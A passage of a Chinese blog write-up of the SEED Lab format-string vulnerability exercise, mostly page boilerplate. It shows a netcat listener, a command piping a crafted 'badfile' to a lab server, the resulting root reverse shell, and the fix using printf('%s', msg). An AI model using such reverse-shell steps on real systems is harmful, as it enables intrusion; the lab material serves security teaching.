+<p>开一个shell监听</p>
+ <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">6</span> <span class="hljs-number">53258</span><br>root<span class="hljs-variable">@7ebdb2357116</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>另一个shell执行：<code>cat badfile | nc 10.9.0.6 9090</code></p>
+<p>获得反向shell</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">6</span> <span class="hljs-number">53258</span><br>root<span class="hljs-variable">@7ebdb2357116</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-6-Fixing-the-Problem"><a href="#Task-6-Fixing-the-Problem" class="headerlink" title="Task 6: Fixing the Problem"></a>Task 6: Fixing the Problem</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ make <br>gcc -o <span class="hljs-keyword">server</span> <span class="hljs-keyword">server</span>.c<br>gcc -DBUF_SIZE=<span class="hljs-number">100</span> -z execstack  -static -m32 -o <span class="hljs-keyword">format</span><span class="hljs-number">-32</span> <span class="hljs-keyword">format</span>.c<br><span class="hljs-keyword">format</span>.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> ‘myprintf’:<br><span class="hljs-keyword">format</span>.c:<span class="hljs-number">44</span>:<span class="hljs-number">5</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">format</span> <span class="hljs-keyword">not</span> a string literal <span class="hljs-keyword">and</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">format</span> arguments [-Wformat-<span class="hljs-keyword">security</span>]<br>   <span class="hljs-number">44</span> |     printf(msg);<br>      |     ^~~~~~<br>gcc -DBUF_SIZE=<span class="hljs-number">100</span> -z execstack  -o <span class="hljs-keyword">format</span><span class="hljs-number">-64</span> <span class="hljs-keyword">format</span>.c<br><span class="hljs-keyword">format</span>.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> ‘myprintf’:<br><span class="hljs-keyword">format</span>.c:<span class="hljs-number">44</span>:<span class="hljs-number">5</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">format</span> <span class="hljs-keyword">not</span> a string literal <span class="hljs-keyword">and</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">format</span> arguments [-Wformat-<span class="hljs-keyword">security</span>]<br>   <span class="hljs-number">44</span> |     printf(msg);<br>      |     ^~~~~~<br></code></pre></td></tr></table></figure>
+
+<p>避免将客户端输入的字符串作为格式化字符串</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">// This line has a <span class="hljs-keyword">format</span>-string vulnerability<br>    <span class="hljs-keyword">printf</span>(msg);<br><span class="hljs-regexp">//</span> This line <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have a <span class="hljs-keyword">format</span>-string vulnerability<br>    <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,msg);<br></code></pre></td></tr></table></figure>
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SEED-lab/" class="category-chain-item">SEED-lab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SEED-lab：Format String Vulnerability Lab</div>
+      <div>http://gls.show/p/df8f6639/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月7日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/2c54864f/" title="CSAPP-lab：malloc lab">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CSAPP-lab：malloc lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/634ccbb5/" title="R语言入门">
+                        <span class="hidden-mobile">R语言入门</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
